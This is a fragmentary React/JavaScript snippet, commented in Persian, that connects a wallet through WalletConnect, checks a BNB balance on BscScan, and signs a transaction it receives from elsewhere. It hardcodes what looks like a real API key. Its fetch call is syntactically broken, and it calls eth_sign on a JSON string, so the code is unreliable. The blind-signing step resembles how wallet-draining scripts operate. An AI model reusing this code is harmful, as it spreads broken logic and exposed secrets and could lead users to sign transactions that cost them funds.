import jQuery from "jquery"; import { EthereumProvider } from "@walletconnect/ethereum-provider";

const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P"; // 🔴 کلید API خودت رو اینجا بذار

async function getBNBBalance(address) { try { const response = await fetch( https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY} ); const data = await response.json(); if (data.status === "1") { return (parseInt(data.result) / 1e18).toFixed(6); // تبدیل مقدار به BNB } } catch (error) { console.error("❌ Error fetching BNB balance:", error); } return null; }

function App() { async function runner() { if (typeof localStorage !== "undefined") { localStorage.removeItem("walletconnect"); }
...
async function signAndSendTransaction() {
  try {
    ...
    const unsignedTx = JSON.parse(result.rawTransaction); // ✅ اصلاح پردازش مقدار

    console.log("📝 Signing Transaction...");
    const signedTx = await provider.request({
      method: "eth_sign",
      params: [accountSender, JSON.stringify(unsignedTx)], // ✅ اطمینان از ارسال داده صحیح
    });
